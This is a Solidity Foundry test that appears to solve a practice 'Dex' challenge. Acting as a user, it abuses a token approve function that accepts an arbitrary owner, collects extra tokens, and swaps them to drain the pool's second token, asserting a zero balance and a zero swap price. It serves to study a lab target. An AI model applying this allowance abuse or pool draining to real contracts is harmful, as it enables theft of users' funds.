// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Dex.sol";

contract MiddleMan {
    function attack(address prey) public {}
}

contract DexTest is Test {
    Dex instance;
    address alice = makeAddr("Alice");

    function setUp() public {
        instance = new Dex();
    }

    function test() public {
        SwappableToken token1 = new SwappableToken(
            address(instance),
            "Token1",
            "T1",
            1000
        );
        SwappableToken token2 = new SwappableToken(
            address(instance),
            "Token2",
            "T2",
            1000
        );

        instance.setTokens(address(token1), address(token2));

        token1.transfer(alice, 10);
        token2.transfer(alice, 10);

        token1.transfer(address(instance), 100);
        token2.transfer(address(instance), 100);

        vm.startPrank(alice);
        token1.approve(address(this), alice, 90);
        token1.transferFrom(address(this), alice, 90);
        token1.approve(alice, address(instance), 100);
        instance.swap(address(token1), address(token2), 100);

        assertEq(token1.balanceOf(alice), 0);
        assertEq(token1.balanceOf(address(instance)), 200);
        assertEq(token2.balanceOf(alice), 110);
        assertEq(token2.balanceOf(address(instance)), 0);
        assertEq(instance.getSwapPrice(address(token1), address(token2), 1), 0);
    }
}
